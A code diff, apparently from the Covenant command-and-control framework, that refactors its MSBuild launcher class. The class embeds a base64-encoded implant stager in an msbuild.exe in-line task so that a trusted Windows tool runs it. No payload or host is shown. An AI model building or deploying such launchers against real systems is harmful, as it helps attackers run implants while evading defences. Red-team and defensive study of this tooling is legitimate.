@@ -18,14 +18,14 @@ namespace Covenant.Models.Launchers
 
         public MSBuildLauncher()
         {
-            this.Name = "MSBuild";
             this.Type = LauncherType.MSBuild;
             this.Description = "Uses msbuild.exe to launch a Grunt using an in-line task.";
             this.OutputKind = OutputKind.WindowsApplication;
             this.CompressStager = true;
+            this.DotNetVersion = Core.Common.DotNetVersion.Net40;
         }
 
-        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
+        public override string GetLauncherString(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
             this.StagerCode = StagerCode;
             this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
@@ -33,12 +33,12 @@ namespace Covenant.Models.Launchers
             this.DiskCode = DiskCode.Replace("{{TARGET_NAME}}", this.TargetName);
             this.DiskCode = DiskCode.Replace("{{TASK_NAME}}", this.TaskName);
 
-            string launcher = "msbuild.exe" + " " + "file.xml";
+            string launcher = "msbuild.exe" + " " + template.Name + ".xml";
             this.LauncherString = launcher;
             return this.LauncherString;
         }
 
-        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
+        public override string GetHostedLauncherString(Listener listener, HostedFile hostedFile)
         {
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
